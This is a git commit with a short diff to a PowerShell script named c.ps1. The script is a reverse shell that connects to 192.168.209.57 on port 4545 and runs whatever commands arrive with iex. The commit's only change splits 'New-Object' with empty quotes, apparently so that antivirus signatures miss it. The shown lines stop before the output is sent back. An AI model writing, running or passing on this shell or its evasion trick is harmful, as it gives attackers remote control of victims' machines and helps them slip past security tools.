6e22a78a3779c3f427d05afd1f624181db1cd3e4
Maciej Mazur <marowid@gmail.com>
2024-01-27 12:09:39 +0100

    Update c.ps1

--- c.ps1
+++ c.ps1
@@ -1,5 +1,5 @@
 $A='192.168.209.57';$B='4545';
-$C=New-Object System.Net.Sockets.TCPClient($A,$B);$D=$C.GetStream();
+$C=New-Obje''ct System.Net.Sockets.TCPClient($A,$B);$D=$C.GetStream();
 [Byte[]]$E=0..65535|%{0};while(($F=$D.Read($E,0,$E.Length)) -ne 0){
 $G=(New-Object System.Text.ASCIIEncoding).GetString($E,0,$F);
 $H=(iex ". {$G} 2>&1" | Out-String);
